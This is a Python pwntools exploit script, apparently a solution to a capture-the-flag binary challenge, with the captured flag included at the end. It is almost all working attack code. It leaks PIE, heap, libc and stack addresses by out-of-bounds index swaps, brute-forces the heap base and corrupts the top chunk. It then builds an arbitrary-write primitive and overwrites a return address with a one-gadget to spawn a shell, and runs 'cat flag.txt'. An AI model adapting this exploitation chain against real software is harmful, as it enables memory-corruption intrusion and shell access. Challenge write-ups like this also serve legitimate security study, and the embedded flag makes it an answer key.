#!/usr/bin/env python2
#-*- coding: future_fstrings -*-
from pwn import *
context.log_level = "fatal"
p = None
def swap(idx1, idx2):
    p.recvuntil("exception:")
    p.sendline(f"{idx1} {idx2}")

count = 0
while True:
    count += 1 
    try:
        if "remote" in os.environ:
            p = remote("mc.ax", 31040)
            p.recvline()
            cmd = p.recvline().strip()
            x = process(cmd, shell=True)
            POW = x.recvline()
            x.close()
            p.sendline(POW)
        else:
            p = remote("172.17.0.2", 5000)

        print "START"
        for i in range(6):
            swap(-0x18+i, i)
        p.recvuntil("\x1B[31;49;1;4m")
        leak = u64(p.recvline()[:6].ljust(8, "\x00"))
        pie_base = leak - 0xf008
        addr_data = pie_base + 0xf020
        print "pie", hex(pie_base), count
        
        addr_heap = pie_base + 0x15000 # without ASLRAS
        addr_heap = 0x1d13000 + pie_base # bruteforce heap (need 256 trials in avg)

        swap(addr_heap - addr_data, addr_heap - addr_data)
        if "Segmentation fault" in p.recvuntil("Segmentation fault", timeout=5):
            p.close()
            continue
    
        print "Valid!", hex(addr_heap), count
        for i in range(0, 0x21):
            swap(addr_heap - addr_data + 0x8 - 0x1000 * i, 1)
            p.recvuntil("\x1B[31;49;1;4m")
            ret = p.recvn(2)
            print ord(ret[1])
            if ord(ret[1]) == 0x91:     # 0x291 of tcache chunk
                addr_heap -= i * 0x1000
                break
            # break

        print "Heap!!", hex(addr_heap)

        addr_top = addr_heap + 0xab0
        
        # [!] overwrite top chunk's size (0x20551 -> 0x551)
        swap(addr_heap - addr_data + 0xA, addr_top - addr_data + 0xA)   

        swap("1" * 0x800, "1" * 0x800)  # free top chunk and leave libc addr on heap
        for i in range(6):
            print i
            swap(addr_heap + 0xAC8 - addr_data + i, i)

        p.recvuntil("\x1B[31;49;1;4m")
        leak = u64(p.recvn(6) + "\x00\x00")
        print hex(leak)
        libc = leak - 0x21ace0
        environ = libc + 0x222200
        print "libc", hex(libc)
        print "environ", hex(environ)

        for i in range(6):
            swap(environ - addr_data + i, i)

        p.recvuntil("\x1B[31;49;1;4m")
        stack = u64(p.recvn(6) + "\x00\x00")
        print "stack", hex(stack)

        addr_ret = stack - 0x120 # 0x7fffffffedc8
        addr_a = stack - 0x140
        addr_b = stack - 0x138

        l_binsh = libc + 0x1d8678
        l_system = libc + 0x0050d70
        l_rdi_r = libc + 0x2a3e5

        def aaw(addr, val):
            for i, x in enumerate(p64(val)):
                if i == 6:
                    break
                x = ord(x)
                if x == 0:
                    swap(addr+i-addr_data, addr+i-addr_data)
                else:
                    swap(addr_b-addr_data, (x)) # data[ord(x)] = x
                    swap(addr+i-addr_data, x) # ret[i] = x

        aaw(addr_ret-8, pie_base + 0xf800)
        aaw(addr_ret, libc+0xebc88) # one gadget ()
        """
            address rbp-0x78 is writable (rbp <= pie_base + 0xf800)
            [rsi] == NULL || rsi == NULL (O)
            [rdx] == NULL || rdx == NULL (O)
        """
        
        # aaw(addr_ret+8, l_binsh)
        # aaw(addr_ret+16, l_rdi_r+1)
        # aaw(addr_ret+24, l_system)
        p.sendline("0 0")

        sleep(0.1)
        p.sendline("id")
        p.sendline("cat flag.txt")

        p.interactive()
    except KeyboardInterrupt:
        break
    except:
        p.close()
        count = 0
"""
dice{i7_S33MS_sOm3BODY_cOOK3D_h3r3_8ff4c343}
"""
